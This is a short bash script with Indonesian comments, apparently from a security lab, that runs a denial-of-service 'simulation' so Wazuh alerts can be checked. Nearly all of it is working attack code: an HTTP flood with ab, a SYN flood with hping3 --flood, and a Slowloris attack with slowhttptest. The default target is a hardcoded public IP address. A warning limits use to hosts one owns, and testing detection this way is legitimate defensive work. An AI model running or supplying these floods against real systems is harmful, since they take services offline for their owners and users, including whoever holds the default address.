#!/usr/bin/env bash
# =============================================================
# 05-ddos-simulation.sh
# Proof of Concept DDoS terhadap target VM milik sendiri.
# ⚠️  HANYA gunakan terhadap host yang Anda miliki / izinkan.
#
# Env:
#   TARGET   : IP atau host target (wajib)
#   MODE     : http | syn | slow  (default: http)
#   DURATION : durasi detik (default: 60)
# Contoh:
#   TARGET=20.30.40.50 MODE=http DURATION=120 ./05-ddos-simulation.sh
# =============================================================
set -euo pipefail

TARGET="${TARGET:-20.212.25.217}" # Ganti dengan IP target Anda
MODE="${MODE:-http}"
DURATION="${DURATION:-60}"

echo "============================================================"
echo " DDoS PoC"
echo " Target   : $TARGET"
echo " Mode     : $MODE"
echo " Duration : ${DURATION}s"
echo "============================================================"
read -rp "Lanjutkan? (yes/no) " ans
[ "$ans" = "yes" ] || { echo "Dibatalkan."; exit 0; }

_APT_UPDATED=0

install_if_missing () {
  local pkg=$1
  command -v "$pkg" >/dev/null 2>&1 && return 0
  
  # Update apt cache on first install attempt
  if [ $_APT_UPDATED -eq 0 ]; then
    echo "==> Updating apt cache..."
    sudo apt-get update -qq
    _APT_UPDATED=1
  fi
  
  sudo apt-get install -y --fix-missing "$pkg" 2>/dev/null || true
}

case "$MODE" in
  http)
    install_if_missing apache2-utils    # menyediakan 'ab'
    echo "==> HTTP Flood (ab) selama ${DURATION}s"
    timeout "${DURATION}" ab -n 1000000 -c 500 -r "http://${TARGET}/" || true
    ;;
  syn)
    install_if_missing hping3
    echo "==> SYN Flood (hping3) selama ${DURATION}s"
    sudo timeout "${DURATION}" hping3 -S --flood -p 80 "$TARGET" || true
    ;;
  slow)
    install_if_missing slowhttptest
    echo "==> Slowloris (slowhttptest) selama ${DURATION}s"
    slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u "http://${TARGET}/" -x 24 -p 3 -l "$DURATION" || true
    ;;
  *)
    echo "Mode tidak dikenal: $MODE (gunakan http|syn|slow)"
    exit 1
    ;;
esac

echo
echo "✅ Simulasi selesai. Cek dashboard Wazuh untuk alert."
